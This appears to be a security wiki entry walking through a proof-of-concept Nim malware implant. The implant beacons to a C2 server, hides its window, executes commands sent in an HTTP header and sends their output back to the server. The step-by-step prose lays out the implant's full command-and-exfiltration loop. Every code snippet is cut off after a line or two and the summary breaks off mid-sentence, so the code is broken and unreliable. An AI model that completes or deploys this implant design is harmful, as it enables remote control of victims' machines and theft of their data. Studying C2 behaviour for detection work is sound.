---
id: a4ee0fe8-6e69-4a99-bef4-c2e2d03934c9
name: Malware Communication With C2 Servers
type: procedure
verified: false
submitted: false
created_at: '2023-06-06T03:07:45.880689+00:00'
updated_at: '2023-06-06T16:19:30.729392+00:00'
tags:
- '[[hacking]]'
- '[[security]]'
---

# Malware Communication With C2 Servers

## Summary

This proof of concept nim code shows how malware communicates with C2 servers to receive, execute and exfiltrate data. As this is to show malware and C2 communication, the following code will get caught by EDR due to the lack of API calls, obfuscation, encoding, and various other techniques used to

## Description

# Description

This proof of concept nim code shows how malware communicates with C2 servers to receive, execute and exfiltrate data. As this is to show malware and C2 communication, the following code will get caught by EDR due to the lack of API calls, obfuscation, encoding, and various other techniques used to disguise malware as legitimate programs.

This code can be compiled and used by setting up a basic HTTP Server as a C2. You will have to be able to set headers if you want to run commands.



# Code



**Code**: [[import std/[httpclient, json]
import std/osproc
]]



# Compile



**Code**: [[nim c -d=mingw --app=console --cpu=amd64 C:\Path\T]]





# Code Breakdown

First, we import the required modules. The important ones to note are:

- **httpclient **allows us to make outbound calls to an external server

- **json **is how we will send the http request outbound

- **osproc **and **os **allow us to run system calls



**Code**: [[import std/[httpclient, json]
import std/osproc
]]



Next we define our C2 server or redirectors IP/Hostname and a user agent



**Code**: [[const server = "http://127.0.0.1"
const defUserAg]]



We want to give our host machine a unique name so the C2 server can identify which machine is which

- In this case we use **getTime **passed through **md5 **to define our machine name

- The initial call is then sent to the C2 server. We also set a constant sleep time, which we can update later



**Code**: [[let Name = getTime()
var Outp_shell_md5 = toMD5($]]



Since this is a PE file, we want it to run in the background. To accomplish this, we use a Windows API to hide the window when executed



**Code**: [[#Background Window
proc Stealth() =
  var Stealt]]



The final setup for this malware is giving a quit function if we no longer want our malware to run



**Code**: [[proc die() =
  quit QuitFailure]]



The setup for the malware is now complete. We start a **while True** connection to always have the program running as well as set the sleep time period between requests



**Code**: [[while true: #Maintain Connection
    let sleeptim]]



Next we send out HTTP request to the server we defined earlier. 

- **newHttpHeaders **defines our malware so the C2 server can know which computer is sending the request

- **GetCommand.request** sends a request to the C2 server using GET method 

- We define several variables, **response**, **cmd**, **event_id**, **jitter **based off the response from the C2 server headers

- These headers will be used to know what the malware is suppose to run



**Code**: [[var GetCommand = newHttpClient(userAgent= defUserA]]



In the above code, we set the variable cmd equal to the X-cmd header, which is how the C2 will communicate which commands it wants the malware to run. We start by seeing if the C2 wants us to run a command. Should the C2 define an X-cmd header, we enter the if statement. Otherwise, we skip to the else statement and repeat the process 



**Code**: [[if cmd != "None": #If X-cmd is not empty, execute]]



Now we enter the if statement, meaning the C2 told us to run a command

- First we check if the command was **quit**

- Should the command not be die, we enter the else block

- Here, we start with a **try **as we do not want the shell to die because of an improper command being sent

- Next, we run the command through **execProcess **and save the output in a variable of** Outp_shell_string**

- We then create a **newHttpClient **request and send the output in the body



**Code**: [[if cmd == "quit":
    die()
else:
    try:
   ]]



It is important to not the shell die because of improper commands being sent. This is why we have an **except **to catch any **OSError **thrown by commands being run



**Code**: [[except OSError:
  let client = newHttpClient()
 ]]





## Tags

- [[hacking]]
- [[security]]


